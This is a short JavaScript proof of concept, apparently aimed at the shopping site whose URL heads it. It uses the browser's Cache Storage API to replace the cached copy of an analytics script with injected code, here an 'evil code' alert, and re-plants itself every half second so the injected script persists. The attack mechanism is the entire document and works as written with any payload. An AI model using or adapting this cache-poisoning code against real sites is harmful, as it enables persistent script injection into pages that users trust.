https://www.taobao.com

```
async function fn() {
    const name = 'tbh:static';
    const url = 'https://g.alicdn.com/alilog/mlog/aplus_v2.js';
    const payload = `
alert('evil code - ' + location.href);
`
    let cache = await caches.open(name);
    let req = new Request(url);
    let res = new Response(payload + fn + ';fn()');

    setInterval(_ => {
      cache.put(req, res.clone());
    }, 500);
}
fn();
```
